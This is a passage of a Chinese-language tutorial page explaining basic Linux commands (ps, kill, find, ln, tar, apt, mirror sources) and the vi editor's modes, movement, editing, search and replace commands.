<li>所谓进程，通俗的说就是 <strong>当前正在执行的一个程序</strong></li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>ps aux</td>
<td>process status查看进程的详细状况</td>
</tr>
<tr>
<td>top</td>
<td>动态显示运行中的进程并且排序</td>
</tr>
<tr>
<td>kill[-9] 进程代号</td>
<td>终止指定代号的进程，-9 表示强行终止</td>
</tr>
</tbody></table>
<blockquote>
<p>ps 默认智慧显示当前用户通过终端启动的应用程序</p>
</blockquote>
<ul>
<li><p>ps 选项说明功能    </p>
<p><strong>PID ** 表示 **进程代号</strong></p>
<p><strong>user</strong> 表示 <strong>当前用户身份</strong></p>
</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>显示终端上的所有进程，包括其他用户的进程</td>
</tr>
<tr>
<td>u</td>
<td>显示进程的详细状态</td>
</tr>
<tr>
<td>x</td>
<td>显示没有控制终端的进程</td>
</tr>
</tbody></table>
<p><strong>kill -9 进程代号</strong>    中的 <strong>-9 表示强行终止</strong>，而<strong>-9通常用在</strong></p>
<p><strong>单纯用kill无法结束的进程</strong> 就可以<strong>加一个 -9</strong>，</p>
<blockquote>
<p>提示：使用kill命令时，最好只终止当前用户开启的进程，而不要终止root身份开启的进程，否则可能导致系统崩溃</p>
<ul>
<li>要退出top可以直接输入q</li>
</ul>
</blockquote>
<p><strong>kill命令使用时，先用ps查询进程代号，再用kill结束想要结束的进程。</strong></p>
<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><ul>
<li><p>查找文件</p>
<ul>
<li>find</li>
</ul>
</li>
<li><p>软连接</p>
<ul>
<li>ln</li>
</ul>
</li>
<li><p>打包和压缩</p>
<ul>
<li>tar</li>
</ul>
</li>
<li><p>软件安装</p>
<ul>
<li>apt-get</li>
</ul>
</li>
</ul>
<h4 id="01-查找文件"><a href="#01-查找文件" class="headerlink" title="01.查找文件"></a>01.查找文件</h4><ul>
<li>find命令功能非常强大，通常用来在  <strong>特定的目录下 搜索</strong> 符合条件的文件</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>find[路径] -name “*搜索条件”</td>
<td>查找指定路径下的文件，包括子目录</td>
</tr>
</tbody></table>
<ul>
<li>如果省略路径，表示在当前文件夹下查找</li>
<li>之前的通配符，在使用find命令时也可以使用</li>
</ul>
<h4 id="演练目标"><a href="#演练目标" class="headerlink" title="演练目标"></a>演练目标</h4><ul>
<li>1.搜索桌面目录下，文件名包含 1 的文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find [桌面&#x2F;] -name “*1*”</span><br></pre></td></tr></table></figure>

<ul>
<li><ol start="2">
<li>搜索桌面目录下，所有以 .txt 为扩展名的文件</li>
</ol>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find [桌面&#x2F;] -name &quot;*.txt&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>3.搜索桌面目录下，以数字1开头的文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find [桌面&#x2F;] -name &quot;1*&quot;</span><br></pre></td></tr></table></figure>

<p>如果省略路径，是搜索当前路径下的全部文件和目录</p>
<h4 id="02-软连接"><a href="#02-软连接" class="headerlink" title="02.软连接"></a>02.软连接</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ln -s 被链接的源文件链接文件</strong></td>
<td>建立文件的软链接，用通俗的方式讲<strong>类似于Windows</strong>下的 <strong>快捷方式</strong></td>
</tr>
</tbody></table>
<ul>
<li><p>注意：</p>
</li>
<li><p>1.没有 -s 选项建立的是一个 硬链接文件      <strong>-s选项是不能省略的</strong></p>
</li>
<li><p>两个文件占用相同大小的硬盘空间，工作中几乎不会建立文件的硬链接</p>
</li>
<li><p>2源文件要使用绝对路径，不能使用相对路径，这样可以方便移动链接文件后，仍然能够正常使用</p>
<h4 id="硬链接（知道）"><a href="#硬链接（知道）" class="headerlink" title="硬链接（知道）"></a>硬链接（知道）</h4></li>
<li><p>在使用ln 创建链接时，如果没有-s 选项 ，会创建一个硬链接，而不是软连接</p>
</li>
</ul>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575263025925.png" alt="1575197462224"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575197931725.png" alt="1575197931725"></p>
<h4 id="03-打包压缩"><a href="#03-打包压缩" class="headerlink" title="03.打包压缩"></a>03.打包压缩</h4><ul>
<li>打包压缩 是日常工作中备份文件的一种方式</li>
<li>在不同操作系统中，常用的打包压缩方式是不同的<ul>
<li>在Windows 常用 rar</li>
<li>mac 常用 zip</li>
<li>Linux 常用 tar.gz</li>
</ul>
</li>
</ul>
<h4 id="3-1打包-压缩"><a href="#3-1打包-压缩" class="headerlink" title="3.1打包/压缩"></a>3.1打包/压缩</h4><ul>
<li>tar 是linux中最常用的<strong>备份</strong> 工具，此命令可以 把一系列文件 打包到 <strong>一个大文件中</strong>，也可以把一个 打<strong>包的大文件恢复成一系列文件</strong></li>
<li>tar命令格式 如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 打包文件</span><br><span class="line">tar -cvf 打包文件.tar 被打包文件&#x2F;路径...</span><br><span class="line"></span><br><span class="line">#解包文件</span><br><span class="line">tar -xvf 打包文件.tar</span><br></pre></td></tr></table></figure>

<ul>
<li>tar 选项说明</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>c</strong></td>
<td><strong>生成档案文件，创建打包文件</strong></td>
</tr>
<tr>
<td><strong>x</strong></td>
<td><strong>揭开档案文件</strong></td>
</tr>
<tr>
<td><strong>v</strong></td>
<td><strong>列出归档解档的详细过程，显示进度</strong></td>
</tr>
<tr>
<td><strong>f</strong></td>
<td><strong>指定档案文件名称，f后面一定是.tar文件,所以必须放选项最后</strong></td>
</tr>
</tbody></table>
<blockquote>
<p>注意：<strong>f选项必须放在最后</strong>，其他选项顺序随意。</p>
</blockquote>
<p><strong>tar 只负责打包不负责压缩</strong></p>
<h4 id="3-2压缩-解压缩"><a href="#3-2压缩-解压缩" class="headerlink" title="3.2压缩/解压缩"></a>3.2压缩/解压缩</h4><p><strong>1）gzip</strong></p>
<ul>
<li>tar与gzip命令结合可以是实现文件 打包和压缩<ul>
<li>tar 只负责打包文件，但不压缩</li>
<li>用gzip压缩tar打包后的文件，其扩展名一般用xxx.tar.gz</li>
</ul>
</li>
</ul>
<blockquote>
<p>在linux中，最常见的压缩文件格式就是xxx.tar.gz</p>
</blockquote>
<ul>
<li>在tar 命令中有一个选项 -z 可以调用gzip ，从而可以方便的实现压缩和解压缩的功能</li>
<li>命令格式如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 压缩文件</span><br><span class="line">tar -zcvf 打包文件.tar.gz 被压缩的文件&#x2F;路径...</span><br><span class="line"></span><br><span class="line">#  解压缩文件</span><br><span class="line">tar -zxvf 打包文件.tar.gz</span><br><span class="line"></span><br><span class="line"># 解压缩到指定路径</span><br><span class="line">tar -zxvf 打包文件.tar.gz -C 目标路径</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-C</strong></td>
<td>解压缩到指定目录，注意：<strong>要解压缩的目录必须存在</strong> <br>如果不存在解压缩无法完成。</td>
</tr>
</tbody></table>
<p><strong>2）bzip2（two）</strong></p>
<ul>
<li><p>tar与bzip2 命令结合可以使用实现文件打包和压缩（用法和gzip一样）</p>
<ul>
<li>tar 只负责打包文件，但不压缩</li>
<li><strong>用bzip2 压缩 tar 打包后的文件，其扩展名一般用xxx.tar.bz2</strong></li>
</ul>
</li>
<li><p>在 <strong>tar 命令中</strong>有一个选项 <strong>-j</strong> 可以调用 <strong>bzip2</strong>，从未可以方便的<strong>实现压缩和及压缩的功能</strong></p>
</li>
<li><p>命令格式如下：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 压缩文件</span><br><span class="line">tar -jcvf 打包文件.tar.bz2 被压缩的文件&#x2F;路径..</span><br><span class="line"></span><br><span class="line">#解压缩文件</span><br><span class="line">tar -jxvf 打包文件.tar.bz2</span><br></pre></td></tr></table></figure>

<p>想要用<strong>gzip</strong> 时候 加  <strong>-z</strong>   想要用<strong>bzip2</strong> 加  <strong>-j</strong></p>
<h4 id="04-软件安装"><a href="#04-软件安装" class="headerlink" title="04.软件安装"></a>04.软件安装</h4><h5 id="4-1-通过apt-安装-卸载软件"><a href="#4-1-通过apt-安装-卸载软件" class="headerlink" title="4.1.通过apt 安装/卸载软件"></a><strong>4.1.通过apt 安装/卸载软件</strong></h5><ul>
<li>apt 是Advanced Packaging Tool,是Linux下的一款安装包管理工具</li>
<li>可以在终端中方便的 <strong>安装/卸载/更新软件包</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 1.安装软件</span><br><span class="line">$ sudo apt install 软件包</span><br><span class="line"></span><br><span class="line"># 2.卸载软件</span><br><span class="line">$ sudo apt remove 软件名</span><br><span class="line"></span><br><span class="line"># 3.更新已安装的包</span><br><span class="line">$ sudo apt upgrade</span><br></pre></td></tr></table></figure>

<p><strong>要使用 apt 必须要用 sudo 用 root 身份执行</strong></p>
<p>安装演练</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一个小火车提示</span><br><span class="line">$ sudo apt install sl</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575263077714.png" alt="1575263077714"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一个比较漂亮的查看当前进程排名的软件</span><br><span class="line">$ sudo apt install htop</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575197462224.png" alt="1575263025925"></p>
<h4 id="4-2配置软件源"><a href="#4-2配置软件源" class="headerlink" title="4.2配置软件源"></a>4.2配置软件源</h4><ul>
<li>如果希望Ubuntu 中安装软件，<strong>更加快速</strong>，可以通过<strong>设置镜像源</strong>，选择一个访问网速更快的服务器来提供软件下载/安装服务</li>
<li>提示：更换服务器之后，需要一个相对不较长时间的更新过程，需要耐心等待。更新完成后，在安装软件都会从新设置的服务器下载软件了</li>
</ul>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575263291116.png" alt="1575263291116"></p>
<p><strong>软件源概念：</strong></p>
<p>Ubuntu提供有一个<strong>主服务器，</strong>主服务器有<strong>所有软件的安装包</strong>，我们就会吧这个<strong>主服务器叫做软件源</strong>，所谓软件源，就是<strong>提供所有软件安装包的源头</strong>。</p>
<p><strong>镜像源概念：</strong></p>
<blockquote>
<p>所谓镜像源，就是<strong>所有服务器的内容是相同的（镜像）</strong>，但是根据所在位置不同，国内服务器通常速度会更快一些！</p>
</blockquote>
<h2 id="vi——终端中的编辑器"><a href="#vi——终端中的编辑器" class="headerlink" title="vi——终端中的编辑器"></a>vi——终端中的编辑器</h2><h4 id="目标-4"><a href="#目标-4" class="headerlink" title="目标"></a>目标</h4><ul>
<li>vi简介</li>
<li>打开和新建文件</li>
<li>三种工作模式</li>
<li>常用命令</li>
<li>分屏命令</li>
<li>常用命令速查图</li>
</ul>
<h4 id="01-vi简介"><a href="#01-vi简介" class="headerlink" title="01.vi简介"></a>01.vi简介</h4><h5 id="1-1学习-vi-的目的"><a href="#1-1学习-vi-的目的" class="headerlink" title="1.1学习 vi 的目的"></a>1.1学习 vi 的目的</h5><ul>
<li>在工作中，要对 服务器 上的文件进行 简单 的修改，可以使用ssh远程登录到服务器上，并且使用vi进行快速的编辑即可</li>
<li>常见需要修改的文件包括：<ul>
<li>源程序</li>
<li>配置文件，例如ssh的配置文件~/.ssh/config</li>
</ul>
</li>
</ul>
<blockquote>
<ul>
<li>在没有图形界面的环境下，要编辑文件，vi是最佳选择</li>
<li>每一个要使用Linux的程序员，都应该或多或少学习一些vi的常用命令</li>
</ul>
</blockquote>
<h5 id="1-2vi-和-vim"><a href="#1-2vi-和-vim" class="headerlink" title="1.2vi 和 vim"></a>1.2vi 和 vim</h5><ul>
<li><p>vi的特点</p>
<ul>
<li><strong>没有图形界面</strong> 的 <strong>功能强大</strong>  的<strong>编辑器</strong></li>
<li>只能是编辑 <strong>文本内容，</strong> 不能对字体、段落进行排版</li>
<li><strong>不只吃鼠标操作</strong></li>
<li><strong>没有菜单</strong></li>
<li><strong>只有命令</strong></li>
</ul>
</li>
<li><p><strong>vi 编辑器</strong>在 <strong>系统管理、服务器管理</strong> 编辑文件时，<strong>其功能永远不是图形界面的编辑器能比拟的</strong></p>
</li>
</ul>
<h4 id="02-打开和新建文件"><a href="#02-打开和新建文件" class="headerlink" title="02.打开和新建文件"></a>02.打开和新建文件</h4><ul>
<li>在终端中<strong>输入vi 在后面跟上文件名</strong> 即可</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vi 文件名</span><br></pre></td></tr></table></figure>

<ul>
<li>如果文件已经存在，会直接打开文件</li>
<li>如果文件不存在，会新建一个文件</li>
</ul>
<h4 id="2-1-打开文件并且定位行"><a href="#2-1-打开文件并且定位行" class="headerlink" title="2.1 打开文件并且定位行"></a>2.1 打开文件并且定位行</h4><p>用 <strong>vi</strong> 打开已有内容的文件后，按 <strong>i 进行编辑模式</strong></p>
<ul>
<li>在日常工作中，有可能会遇到 打开一个文件，并定位到指定行 的情况</li>
<li>例如：在开发时，知道某一行代码有错，可以 快速定位 到出错代码的位置</li>
<li>这个时候，可以使用以下命令打开</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vi 文件名 +行数</span><br><span class="line">如果只带上+而不指定行数，或直接定位在末尾</span><br></pre></td></tr></table></figure>

<h4 id="2-2异常处理"><a href="#2-2异常处理" class="headerlink" title="2.2异常处理"></a>2.2异常处理</h4><ul>
<li>如果vi异常退出，再吃攀上可能会保存有交换问及那</li>
<li>下次在使用vi编辑该文件是，会看到一下屏幕信息，按下字母d可以删除交换文件即可</li>
</ul>
<blockquote>
<p>提示：按下键盘是之一关闭输入法</p>
</blockquote>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575267483535.png" alt="1575267483535"></p>
<h4 id="末行模式命令"><a href="#末行模式命令" class="headerlink" title="末行模式命令"></a>末行模式命令</h4><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>w</td>
<td>保存</td>
</tr>
<tr>
<td>q</td>
<td>退出，如果没有保存，不允许退出</td>
</tr>
<tr>
<td>q！</td>
<td>强行退出，不保存退出</td>
</tr>
<tr>
<td>wq</td>
<td>保存并退出</td>
</tr>
<tr>
<td>x</td>
<td>保存并退出</td>
</tr>
</tbody></table>
<h4 id="04-vi-常用命令"><a href="#04-vi-常用命令" class="headerlink" title="04.vi 常用命令"></a>04.vi 常用命令</h4><h4 id="4-1移动（基本）"><a href="#4-1移动（基本）" class="headerlink" title="4.1移动（基本）"></a>4.1移动（基本）</h4><h5 id="1）上、下、左、右"><a href="#1）上、下、左、右" class="headerlink" title="1）上、下、左、右"></a>1）上、下、左、右</h5><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>h</td>
<td>向左</td>
</tr>
<tr>
<td>j</td>
<td>向下</td>
</tr>
<tr>
<td>k</td>
<td>向上</td>
</tr>
<tr>
<td>l</td>
<td>向右</td>
</tr>
</tbody></table>
<h5 id="2）行内移动"><a href="#2）行内移动" class="headerlink" title="2）行内移动"></a>2）行内移动</h5><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>w</td>
<td>向后移动一个单词</td>
</tr>
<tr>
<td>b</td>
<td>向前移动一个单词</td>
</tr>
<tr>
<td>0</td>
<td>行首</td>
</tr>
<tr>
<td>^</td>
<td>行首，第一个不是空白符的位置</td>
</tr>
<tr>
<td>$</td>
<td>行尾</td>
</tr>
</tbody></table>
<h5 id="3）行数移动"><a href="#3）行数移动" class="headerlink" title="3）行数移动"></a>3）行数移动</h5><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>gg</td>
<td>文件顶部</td>
</tr>
<tr>
<td>G</td>
<td>文件末尾</td>
</tr>
<tr>
<td>数字gg</td>
<td>移动到 数字 对应行数</td>
</tr>
<tr>
<td>数字G</td>
<td>移动到 数字 对应行数</td>
</tr>
<tr>
<td>：数字</td>
<td>移动到数字对应行数</td>
</tr>
</tbody></table>
<h5 id="4）屏幕移动"><a href="#4）屏幕移动" class="headerlink" title="4）屏幕移动"></a>4）屏幕移动</h5><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl+b</td>
<td>向上翻页</td>
</tr>
<tr>
<td>Ctrl+f</td>
<td>向下翻页</td>
</tr>
<tr>
<td>H</td>
<td>屏幕顶部</td>
</tr>
<tr>
<td>M</td>
<td>屏幕中间</td>
</tr>
<tr>
<td>L</td>
<td>屏幕底部</td>
</tr>
</tbody></table>
<h5 id="4-2移动（程序）"><a href="#4-2移动（程序）" class="headerlink" title="4.2移动（程序）"></a>4.2移动（程序）</h5><p><strong>1）段落移动</strong></p>
<ul>
<li>在vi中使用 空行 来区分段落</li>
<li>在程序开发是，通常 一段功能相关的代码会写在一起  ——  之间没有空行</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>{</td>
<td>上一段</td>
</tr>
<tr>
<td>}</td>
<td>下一段</td>
</tr>
</tbody></table>
<p><strong>2）括号切换</strong></p>
<ul>
<li>在程序世界中，{}、[]、()  使用频率很高，而且  <strong>都是成对出现的</strong></li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>%</td>
<td>括号匹配及切换</td>
</tr>
</tbody></table>
<h5 id="3）标记"><a href="#3）标记" class="headerlink" title="3）标记"></a>3）标记</h5><ul>
<li>在开发时，某一块代码可能 需要稍后处理，例如：编辑、查看</li>
<li>此时先使用 m 增加一个标记，这样可以 在需要时快速的跳转回来  或者  执行其他编辑操作</li>
<li>标记名称  可以是 a~z 之间的任意 一个 字母 </li>
<li>添加了标记的  行如果被删除，标记同时被删除</li>
<li>如果  在其他行添加了相同名称的标记，之前添加的标记也会被替换掉</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>mx</td>
<td>添加标记x，x是a<del>z 或者A</del>Z之间的任意一个字母</td>
</tr>
<tr>
<td>‘x</td>
<td>直接定位到标记x所在位置</td>
</tr>
</tbody></table>
<h4 id="选中文本（可视模式）"><a href="#选中文本（可视模式）" class="headerlink" title="选中文本（可视模式）"></a>选中文本（可视模式）</h4><ul>
<li>学习复制命令前，应该先学会 <strong>怎样选中 要复制的代码</strong></li>
<li>在 vi 中 要选择文本，需要先使用 visual 命令切换到 <strong>可视模式</strong></li>
<li>vi 中提供了 三种 可是模式，可以方便程序员选择  <strong>选中文本的方式</strong></li>
<li>按ESC 可以放弃选中，返回  <strong>命令模式</strong></li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>模式</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>v</strong></td>
<td><strong>可视模式</strong></td>
<td><strong>从光标位置开始按照正常模式选择文本</strong></td>
</tr>
<tr>
<td><strong>V</strong></td>
<td><strong>可视行模式</strong></td>
<td><strong>选中光标经过的完整行</strong></td>
</tr>
<tr>
<td><strong>Ctrl + v</strong></td>
<td><strong>可是块模式</strong></td>
<td><strong>垂直方向选中文本</strong></td>
</tr>
</tbody></table>
<ul>
<li><strong>可视模式下</strong> ，可以和 <strong>移动命令</strong> 连用， 例如：ggVG 能够选中所有内容</li>
</ul>
<h4 id="4-4撤销和恢复撤销"><a href="#4-4撤销和恢复撤销" class="headerlink" title="4.4撤销和恢复撤销"></a>4.4撤销和恢复撤销</h4><ul>
<li>在学 编辑命令 之前，先要知道怎样撤销之前一次 错误的 编辑动作~</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>u</td>
<td>undo</td>
<td>撤销上次命令</td>
</tr>
<tr>
<td>Ctrl+r</td>
<td>redo</td>
<td>恢复撤销的命令</td>
</tr>
</tbody></table>
<h4 id="4-5删除文本"><a href="#4-5删除文本" class="headerlink" title="4.5删除文本"></a>4.5删除文本</h4><table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>x</td>
<td>cut</td>
<td>删除光标所在字符，胡总和选中文字</td>
</tr>
<tr>
<td>d（移动命令）</td>
<td>delete</td>
<td>删除移动命令对应的内容</td>
</tr>
<tr>
<td>dd</td>
<td>delete</td>
<td>删除光标所在行，可以 ndd 复制多行</td>
</tr>
<tr>
<td>D</td>
<td>delete</td>
<td>删除至行尾</td>
</tr>
</tbody></table>
<blockquote>
<p>提示：如果使用 可视模式 已经选中了一段文本，那么无论使用 d 还是 x，都可以删除选中文本</p>
</blockquote>
<ul>
<li>删除命令可以和 移动命令 连用，一下常见的组合命令：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* d0       #  从光标位置删除到一行的起始位置</span><br><span class="line">* d&#125;       #  从光标位置删除到段落的结尾</span><br><span class="line">* ndd      #  从光标位置向下连续删除 n 行</span><br><span class="line">* d代码行G  #  从光标所在行  删除到 指定代码行  之间的所有代码</span><br><span class="line">* d&#39;a      #  从光标所在行  产出到 标记a  之间的所有代码</span><br></pre></td></tr></table></figure>

<h4 id="4-6-复制、粘贴"><a href="#4-6-复制、粘贴" class="headerlink" title="4.6 复制、粘贴"></a>4.6 复制、粘贴</h4><ul>
<li><strong>vi</strong> 中提供有一个 <strong>被复制文本的缓冲区</strong><ul>
<li><strong>复制</strong> 命令会将选中的文字保存在缓冲区</li>
<li><strong>删除</strong> 命令删除的文字会被保存在缓冲区</li>
<li>再所需的位置，使用 <strong>粘贴</strong> 命令可以将缓冲区的文字<strong>插入到光标所在位置</strong></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>y（移动命令）</strong></td>
<td><strong>copy</strong></td>
<td><strong>复制</strong></td>
</tr>
<tr>
<td><strong>yy</strong></td>
<td><strong>copy</strong></td>
<td><strong>复制一行，可以nyy复制多行</strong></td>
</tr>
<tr>
<td><strong>p</strong></td>
<td><strong>paste</strong></td>
<td><strong>粘贴</strong></td>
</tr>
</tbody></table>
<p><strong>注意</strong></p>
<ul>
<li>命令   <strong>d、x</strong>   本质是<strong>剪切命令</strong>，但<strong>被放入文本缓冲区</strong>，如果有其他<strong>复制或者剪贴命令，之前的剪切内容将被替换。</strong>   也就是说 <strong>vi  中没有删除命令</strong>，<strong>只有剪贴命令，而剪切命令也被认为是删除命令</strong></li>
<li>vi中的 <strong>文本缓冲区</strong>  和   <strong>系统的剪贴板</strong>  不是同一个</li>
<li>所以在其他软件中使用 <strong>Ctrl+C</strong> 复制的内容跟，不能再 <strong>vi</strong> 中通过  <strong>P</strong>  命令粘贴</li>
<li>可以在  <strong>编辑模式</strong>   下使用  <strong>鼠标右键粘贴</strong></li>
</ul>
<h4 id="4-7-替换"><a href="#4-7-替换" class="headerlink" title="4.7 替换"></a>4.7 替换</h4><table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
<th>工作模式</th>
</tr>
</thead>
<tbody><tr>
<td><strong>r</strong></td>
<td><strong>replace</strong></td>
<td><strong>替换当前字符</strong></td>
<td><strong>命令模式</strong></td>
</tr>
<tr>
<td><strong>R</strong></td>
<td><strong>replace</strong></td>
<td><strong>替换当前光标所在位置向后替换</strong></td>
<td><strong>替换模式</strong></td>
</tr>
</tbody></table>
<ul>
<li><strong>R</strong> 命令可以进入 <strong>替换模式</strong> ， 替换完成后，按下<strong>ESC</strong> 可以回到 <strong>命令模式</strong></li>
<li><strong>替换命令</strong>  的作用就是不用进入  <strong>编辑模式</strong>，对文件进行  <strong>轻量级的修改</strong></li>
</ul>
<p><strong>对文件修改幅度非常小可以用替换命令，否则就要使用 编辑模式 再用ESC退出，效率太慢</strong></p>
<h4 id="4-8-缩排和重复执行"><a href="#4-8-缩排和重复执行" class="headerlink" title="4.8 缩排和重复执行"></a>4.8 缩排和重复执行</h4><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>&gt;&gt;</strong></td>
<td><strong>向右增加缩进</strong></td>
</tr>
<tr>
<td><strong>&lt;&lt;</strong></td>
<td><strong>想做减少缩进</strong></td>
</tr>
<tr>
<td><strong>.</strong></td>
<td><strong>重复上次命令</strong></td>
</tr>
</tbody></table>
<ul>
<li><p>缩排命令  在开发程序时，通一增加代码的缩进  比较有用！</p>
<ul>
<li>一次性  在选中代码前增加4个空格，就叫做  增加缩进</li>
<li>一次性  在选中代码前删除4个空格，就叫做减少缩进</li>
</ul>
</li>
<li><p>在  可视模式  下，缩排命令需要使用一个 &gt; 或这 &lt;</p>
</li>
</ul>
<blockquote>
<p>在程序中，缩进 通常用来表示代码的归属关系          缩进对于程序开发非常重要</p>
<ul>
<li>前面空格越少，代码的级别越高</li>
<li>前面空格越多，代码的级别越低</li>
</ul>
</blockquote>
<h4 id="4-9-查找"><a href="#4-9-查找" class="headerlink" title="4.9 查找"></a>4.9 查找</h4><p><strong>常规查找</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>/str（内容）</strong></td>
<td><strong>查找 str</strong></td>
</tr>
</tbody></table>
<ul>
<li>查找到指定内容之后，使用 Next  查找下一个出现的位置：<ul>
<li><strong>n：</strong>查找下一个出现的位置</li>
<li><strong>N：</strong>查找上一个出现的位置</li>
</ul>
</li>
<li>如果不想看到的高亮显示，可以随便查找一个文件中不存在的内容即可</li>
</ul>
<p><strong>单词快速匹配</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>*****</td>
<td><strong>向后查找当前目标虽在单词</strong></td>
</tr>
<tr>
<td><strong>#</strong></td>
<td><strong>向前查找当前光标所在单词</strong></td>
</tr>
</tbody></table>
<ul>
<li>在开发中，通过单词快速匹配，可以快速看到这个单词在其他什么位置使用过</li>
</ul>
<h4 id="4-10-查找并替换"><a href="#4-10-查找并替换" class="headerlink" title="4.10 查找并替换"></a>4.10 查找并替换</h4><ul>
<li>在vi中查找和替换命令需要在 <strong>末行模式下</strong> 执行</li>
<li>格式：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ：%s&#x2F;&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure>

<h4 id="1-全局替换"><a href="#1-全局替换" class="headerlink" title="1)全局替换"></a>1)全局替换</h4><ul>
<li>一次性替换文件中的 <strong>所有出现的旧文本</strong></li>
<li>格式：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ：%s&#x2F;旧内容&#x2F;新内容&#x2F;g</span><br></pre></td></tr></table></figure>

<h4 id="2）可视区域替换"><a href="#2）可视区域替换" class="headerlink" title="2）可视区域替换"></a>2）可视区域替换</h4><ul>
<li><strong>先选中</strong> 要替换文字的 <strong>范围</strong></li>
<li>格式：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#   :s&#x2F;旧文本&#x2F;新文本&#x2F;g</span><br></pre></td></tr></table></figure>

<h4 id="3）确认替换"><a href="#3）确认替换" class="headerlink" title="3）确认替换"></a>3）确认替换</h4><ul>
<li>如果把末尾的g 改成gc 再替换的时候会有提示  是否替换</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#   ：%s&#x2F;旧文本&#x2F;新文本&#x2F;gc</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>y - yes  替换</strong></li>
<li><strong>n - no   不替换</strong></li>
<li><strong>a - all    替换所有</strong></li>
<li><strong>q - quit  退出替换</strong></li>
<li>l - last  最后一个，并把光标移动到行首</li>
<li>^E  向下滚屏</li>
<li>^Y  向上滚屏</li>
</ol>
<h4 id="4-11-插入命令"><a href="#4-11-插入命令" class="headerlink" title="4.11 插入命令"></a>4.11 插入命令</h4><ul>
<li>编辑模式</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
<th>常用</th>
</tr>
</thead>
<tbody><tr>
<td>i</td>
<td>在当前字符前插入文本</td>
<td>常用</td>
</tr>
<tr>
<td>I</td>
<td>在行首插入文本</td>
<td>较常用</td>
</tr>
<tr>
<td>a</td>
<td>在当前字符后添加文本</td>
<td></td>
</tr>
<tr>
<td>A</td>
<td>在行末添加文本</td>
<td>较常用</td>
</tr>
<tr>
<td>o</td>
<td>在当前行后插入一空行</td>
<td>常用</td>
</tr>
<tr>
<td>O</td>
<td>在当前行前面插入一空行</td>
<td>常用</td>
</tr>
</tbody></table>
<p><strong>重复命令：</strong></p>
<p>随便输入一个 <strong>数字</strong>，</p>
